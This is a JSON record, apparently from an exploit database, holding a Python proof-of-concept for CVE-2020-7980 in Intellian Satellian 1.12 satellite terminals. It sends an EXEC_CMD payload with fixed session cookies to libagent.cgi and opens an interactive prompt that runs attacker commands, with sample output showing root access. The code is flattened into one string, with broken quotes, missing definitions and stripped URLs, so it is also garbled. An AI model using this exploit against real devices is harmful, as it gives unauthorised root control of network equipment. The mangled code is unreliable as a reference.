{
    "text": "vul_name : Satellian 1.12 Remote Code Execution ， vul_cve : CVE-2020-7980 ， vul_poc :  # Exploit Title : Satellian 1.12 - Remote Code Execution ，  # Date : 2020-01-28 ，  # Exploit Author : Xh4H ，  # Vendor Homepage :  ，  # Version : v1.12+ ，  # Tested on : Kali linux , MacOS ，  # CVE : CVE-2020-7980 ，  # Github repository :  ，  # xh4h @ Macbook-xh4h ~ /Satellian> python satellian.py -u ，  # _ ，  #  ( _ ) / \\ ，  #  ( oo )  ( Intellian Satellite Terminal PoC )  ，  # /-\\/ -' \\_/ ，  # Performing initial scan. Listing available system binaries. ，  # Starting request to ，  # Executing command /bin/ls /bin ，  # acu_server ，  # acu_tool ，  # addgroup ，  # adduser ，  # . ，  # Satellian $ id ，  # uid=0 ( root ) gid=0 ( root )  ， from termcolor import colored ， sys.stdout.write ( colored ( text + \"\\n\" , color , attrs= [ \"bold\" ]  )  ， cprint ( \"Missing protocol , using http . . .\" , \"yellow\" )  ， url = \" + url ， RCE = {\"O_\" : \"A\" , \"V_\" : 1 , \"S_\" : 123456789 , \"F_\" : \"EXEC_CMD\" , \"P1_\" : {\"F\" : \"EXEC_CMD\" , \"Q\" : command} ， string_to_split = '\"SUCCESS_\" ， } , ' ， cprint ( \"Starting request to %s\" % url , \"yellow\" )  ， cprint ( \"Executing command %s\" % command , \"yellow\" )  ， a = requests.post ( url + '/cgi-bin/libagent.cgi?type=J&' + str ( calendar.timegm ( time.gmtime (  ) + '000' , json=RCE , cookies={'ctr_t' : '0' , 'sid' : '123456789'} )  ， command_output = a.content [ a.content.find ( string_to_split )  : -2 ] .replace ( string_to_split , ' )  ， cprint ( \"Target doesn't seem to be vulnerable\\nExiting.\" , 'red' )  ， sys.exit (  )  ， print command_output ， cprint ( \" ， _ ，  ( _ ) / \\ ，  ( oo )  ( Intellian Satellite Terminal PoC )  ， /-\\/ -' \\_/ ， \" , \"green\" )  ， parser = argparse.ArgumentParser ( description=\"Satellian : A PoC script for CVE-2020-7980\" )  ， parser.add_argument ( \"-u\" , \"-url\" , help=\"Base url\" )  ， args = parser.parse_args (  )  ， cprint ( \"Missing arguments.\\nUsage example : \\n\" + sys.argv [ 0 ] + \" -u \"red\" )  ， sys.exit (  )  ， url = httpize ( args.url )  ， cprint ( \"Performing initial scan. Listing available system binaries.\" , \"green\" )  ， send_command ( url , '/bin/ls /bin' , True )  ， command = raw_input ( 'Satellian $ ' )  ， send_command ( url , command , False )  ， main (  )  ， print e ， print \"\\nAn error happened.\"",
    "time": "2020.01.30"
}